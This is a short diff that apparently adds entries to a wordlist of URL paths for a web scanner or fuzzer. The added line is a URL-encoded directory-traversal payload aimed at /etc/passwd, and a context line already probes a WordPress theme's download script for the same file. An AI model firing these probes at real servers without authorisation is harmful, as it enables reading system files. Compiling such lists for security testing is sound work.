@@ -1276,3 +1276,5 @@
 /wp-content/themes/the-wound/force_download.php?file=/etc/passwd
 /custom-component-collections.html
 /{{js-bundle}}
+/workflow/docs/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+/installer/
